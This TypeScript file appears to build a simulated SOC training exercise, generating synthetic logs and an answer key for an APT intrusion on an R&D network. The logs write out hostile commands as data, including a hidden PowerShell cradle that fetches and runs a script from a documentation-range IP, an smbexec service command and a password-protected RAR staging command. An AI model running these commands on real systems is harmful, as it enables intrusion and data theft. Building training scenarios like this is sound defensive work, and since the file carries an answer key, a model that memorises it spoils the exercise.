import type { Scenario } from "../../types";
import { ScenarioEvents, addNoise, STANDARD_USERS, addSeconds } from "./builder";

/** Scenario 9 — capstone: full APT intrusion chain against R&D (advanced). */
function build(): Scenario {
  const ev = new ScenarioEvents("AP");
  addNoise(ev, { start: "2026-05-11 08:30:00", minutes: 150, count: 120, seed: 99, users: STANDARD_USERS });

  const mail = ev.add({ time: "2026-05-11 08:47:03", index: "email", sourcetype: "ms:o365:messagetrace", host: "o365",
    fields: { sender: "recruiting@talent-hub-careers.com", recipient: "l.chen@corp.local", subject: "Senior Researcher role — salary details", url: "https://talent-hub-careers.com/offer", action: "delivered", spf: "pass" },
    mitre: ["T1566"], risk: { object: "l.chen", objectType: "user", score: 10, rule: "Email - Link To Newly Registered Domain" } });
  const click = ev.add({ time: "2026-05-11 09:02:15", index: "proxy", sourcetype: "bluecoat:proxysg", host: "proxy01",
    fields: { user: "l.chen", src_ip: "10.0.7.2", url: "https://talent-hub-careers.com/offer/Offer_Letter.lnk", http_method: "GET", status: 200, bytes_in: 4210, category: "Newly Registered Domain" } });
  const ps = ev.add({ time: "2026-05-11 09:02:40", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-rnd-02",
    fields: { EventCode: 1, user: "l.chen", process: "powershell.exe", parent_process: "explorer.exe", CommandLine: "powershell -w hidden -c \"iwr https://203.0.113.200/s.ps1 | iex\"" },
    mitre: ["T1059.001"], risk: { object: "ws-rnd-02", objectType: "system", score: 50, rule: "Endpoint - PowerShell Download Cradle" } });
  const task = ev.add({ time: "2026-05-11 09:03:20", index: "wineventlog", sourcetype: "WinEventLog:Security", host: "ws-rnd-02",
    fields: { EventCode: 4698, user: "l.chen", TaskName: "\\Microsoft\\EdgeUpdateTaskCore", TaskCommand: "rundll32.exe C:\\Users\\l.chen\\AppData\\Local\\edge.dll,Run" },
    mitre: ["T1053.005"], risk: { object: "ws-rnd-02", objectType: "system", score: 30, rule: "Endpoint - Scheduled Task Running From AppData" } });
  const beacons: string[] = [];
  for (let i = 0; i < 15; i++) {
    beacons.push(ev.add({ time: addSeconds("2026-05-11 09:04:00", i * 120 + (i % 3) * 2), index: "firewall", sourcetype: "pan:traffic", host: "fw-edge-01",
      fields: { src_ip: "10.0.7.2", src_host: "ws-rnd-02", dest_ip: "203.0.113.200", dest_port: 443, action: "allowed", app: "ssl", bytes: 640 + (i % 2) * 16, process: "rundll32.exe" },
      mitre: ["T1071.001"], risk: i === 4 ? { object: "ws-rnd-02", objectType: "system", score: 60, rule: "Network - Periodic Beaconing Detected" } : undefined }));
  }
  const lsass = ev.add({ time: "2026-05-11 09:41:12", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-rnd-02",
    fields: { EventCode: 10, user: "l.chen", process: "rundll32.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1010" },
    mitre: ["T1003.001"], risk: { object: "ws-rnd-02", objectType: "system", score: 80, rule: "Endpoint - LSASS Memory Access" } });
  const enumAd = ev.add({ time: "2026-05-11 09:44:30", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "ws-rnd-02",
    fields: { EventCode: 1, user: "l.chen", process: "net.exe", parent_process: "rundll32.exe", CommandLine: "net group \"R&D-FileAdmins\" /domain" }, mitre: ["T1087"] });
  const lat = ev.add({ time: "2026-05-11 09:52:05", index: "wineventlog", sourcetype: "WinEventLog:Security", host: "srv-rnd-01",
    fields: { EventCode: 4624, action: "success", user: "adm.tnguyen", src_ip: "10.0.7.2", src_host: "ws-rnd-02", dest: "srv-rnd-01", Logon_Type: 3 },
    mitre: ["T1078", "T1021.002"], risk: { object: "adm.tnguyen", objectType: "user", score: 40, rule: "Access - Admin Logon From Workstation" } });
  const psx = ev.add({ time: "2026-05-11 09:52:09", index: "wineventlog", sourcetype: "WinEventLog:System", host: "srv-rnd-01",
    fields: { EventCode: 7045, user: "adm.tnguyen", Service_Name: "BTOBTO", Service_File_Name: "%COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output", src_host: "ws-rnd-02" },
    mitre: ["T1021.002"], risk: { object: "srv-rnd-01", objectType: "system", score: 60, rule: "Endpoint - Suspicious Service Install (smbexec)" } });
  const stage = ev.add({ time: "2026-05-11 10:05:44", index: "sysmon", sourcetype: "XmlWinEventLog:Sysmon", host: "srv-rnd-01",
    fields: { EventCode: 1, user: "adm.tnguyen", process: "rar.exe", CommandLine: "rar.exe a -hpX9 C:\\PerfLogs\\d.rar E:\\Research\\Project-Helios\\*", parent_process: "cmd.exe" },
    mitre: ["T1005"], risk: { object: "adm.tnguyen", objectType: "user", score: 40, rule: "Endpoint - Encrypted Archive Of Sensitive Share" } });
  const exfil = ev.repeat(4, "2026-05-11 10:14:00", 60, (i) => ({ index: "proxy", sourcetype: "bluecoat:proxysg", host: "proxy01",
    fields: { user: "adm.tnguyen", src_ip: "10.0.7.50", src_host: "srv-rnd-01", url: "https://storage.mega-sync-share.io/upload", http_method: "PUT", status: 201, bytes_out: 610_000_000 + i * 9_000_000, category: "File Sharing" },
    mitre: ["T1567.002"], risk: i === 1 ? { object: "srv-rnd-01", objectType: "system", score: 80, rule: "Network - Large Upload From Server" } : undefined }));
  // Decoy / false positive: vulnerability scanner hitting many hosts
  const scan = ev.repeat(6, "2026-05-11 09:30:00", 20, (i) => ({ index: "firewall", sourcetype: "pan:traffic", host: "fw-core-01",
    fields: { src_ip: "10.0.0.250", src_host: "nessus01", dest_ip: `10.0.7.${10 + i}`, dest_port: 445, action: "allowed", app: "ms-ds-smb", bytes: 300 } }));

  return {
    id: "capstone-apt",
    name: "Capstone — Operation Helios",
    tagline: "A recruiter email, a beacon, stolen admin rights and 2.5 GB of R&D data.",
    difficulty: "advanced",
    attackStory: [
      "l.chen receives a fake recruiter email and downloads Offer_Letter.lnk from talent-hub-careers.com.",
      "The shortcut runs a PowerShell download cradle from 203.0.113.200 and plants a scheduled task for persistence.",
      "rundll32.exe on ws-rnd-02 beacons to 203.0.113.200 every ~2 minutes.",
      "The attacker dumps LSASS, finds the R&D file admins group and reuses adm.tnguyen to reach srv-rnd-01 via smbexec.",
      "Project-Helios research is packed into an encrypted RAR and ~2.5 GB is uploaded to mega-sync-share.io.",
      "The Nessus scanner (nessus01) touching port 445 at 09:30 is scheduled scanning — a decoy, not part of the attack.",
    ],
    events: ev.all(),
    notables: [
      { id: "ACAD-NOT-9001", title: "Endpoint - PowerShell Download Cradle (ws-rnd-02)", urgency: "high", rule: "Endpoint - Susp PowerShell", entity: "ws-rnd-02",
        description: "Hidden PowerShell piping iwr into iex from 203.0.113.200.", eventIds: [ps], recommendedActions: ["Isolate host", "Collect the script"] },
      { id: "ACAD-NOT-9002", title: "Network - Beaconing to 203.0.113.200", urgency: "high", rule: "Network - Beaconing Detected", entity: "ws-rnd-02",
        description: "15 sessions at ~120 s interval, ~640 bytes each.", eventIds: beacons.slice(0, 4), recommendedActions: ["Block IP", "Scope other beacons"] },
      { id: "ACAD-NOT-9003", title: "Network - Large Upload From srv-rnd-01 to File Sharing", urgency: "critical", rule: "Network - Data Exfiltration", entity: "srv-rnd-01",
        description: "~2.5 GB PUT to storage.mega-sync-share.io.", eventIds: exfil, recommendedActions: ["Block destination", "Engage legal", "Preserve evidence"] },
      { id: "ACAD-NOT-9004", title: "Network - SMB Sweep from nessus01", urgency: "low", rule: "Network - Port Sweep", entity: "nessus01",
        description: "6 hosts on 445 in 2 minutes from the vulnerability scanner.", eventIds: scan, recommendedActions: ["Confirm scan window with Vulnerability Management", "Suppress for approved scanner"] },
    ],
    intel: [
      { indicator: "203.0.113.200", type: "ip", threat: "APT C2 server (Cobalt Strike)", source: "MISP - corp-intel", confidence: 90, eventIds: [ps, beacons[0]] },
      { indicator: "talent-hub-careers.com", type: "domain", threat: "Recruitment-themed phishing domain", source: "AlienVault OTX", confidence: 72, eventIds: [mail, click] },
      { indicator: "storage.mega-sync-share.io", type: "domain", threat: "Exfiltration staging used by the same actor", source: "MISP - corp-intel", confidence: 65, eventIds: [exfil[0]] },
    ],
    entities: [
      { type: "user", value: "l.chen", role: "victim", note: "Clicked the recruiter link." },
      { type: "host", value: "ws-rnd-02", role: "compromised", note: "First compromised host — beacon + LSASS dump." },
      { type: "user", value: "adm.tnguyen", role: "compromised", note: "Stolen admin account used for lateral movement and exfil." },
      { type: "host", value: "srv-rnd-01", role: "compromised", note: "R&D file server — data staged and exfiltrated." },
      { type: "ip", value: "203.0.113.200", role: "attacker", note: "Payload host and C2." },
      { type: "domain", value: "talent-hub-careers.com", role: "attacker", note: "Phishing domain." },
      { type: "domain", value: "storage.mega-sync-share.io", role: "attacker", note: "Exfiltration destination." },
      { type: "host", value: "nessus01", role: "benign", note: "Authorised vulnerability scanner — decoy notable." },
    ],
    mitreMap: [
      { techniqueId: "T1566", evidence: "Recruiter-themed email linking to Offer_Letter.lnk.", eventIds: [mail, click] },
      { techniqueId: "T1059.001", evidence: "Hidden PowerShell download cradle.", eventIds: [ps] },
      { techniqueId: "T1053.005", evidence: "EdgeUpdateTaskCore task runs edge.dll from AppData.", eventIds: [task] },
      { techniqueId: "T1071.001", evidence: "~120 s HTTPS beacons to 203.0.113.200.", eventIds: beacons.slice(0, 3) },
      { techniqueId: "T1003.001", evidence: "rundll32 accessing lsass.exe memory.", eventIds: [lsass] },
      { techniqueId: "T1021.002", evidence: "smbexec-style service on srv-rnd-01 from ws-rnd-02.", eventIds: [lat, psx] },
      { techniqueId: "T1005", evidence: "Encrypted RAR of Project-Helios.", eventIds: [stage] },
      { techniqueId: "T1567.002", evidence: "~2.5 GB PUT to mega-sync-share.io.", eventIds: exfil.slice(0, 2) },
    ],
    timeline: [
      { phase: "Phish", tacticId: "TA0001", summary: "Recruiter email + LNK download.", eventIds: [mail, click] },
      { phase: "Execution & persistence", tacticId: "TA0002", summary: "PowerShell cradle + scheduled task.", eventIds: [ps, task] },
      { phase: "Command & control", tacticId: "TA0011", summary: "Beacon every ~2 min.", eventIds: beacons.slice(0, 3) },
      { phase: "Credential theft", tacticId: "TA0006", summary: "LSASS dumped, admin group enumerated.", eventIds: [lsass, enumAd] },
      { phase: "Lateral movement", tacticId: "TA0008", summary: "adm.tnguyen → srv-rnd-01 via smbexec.", eventIds: [lat, psx] },
      { phase: "Collection", tacticId: "TA0009", summary: "Project-Helios archived.", eventIds: [stage] },
      { phase: "Exfiltration", tacticId: "TA0010", summary: "2.5 GB uploaded.", eventIds: exfil.slice(0, 2) },
    ],
    patientZero: { entity: "ws-rnd-02", explanation: "ws-rnd-02 (l.chen) ran the first attacker code; all later activity traces back to it. nessus01 is a decoy." },
  };
}

export const CAPSTONE_APT = build();
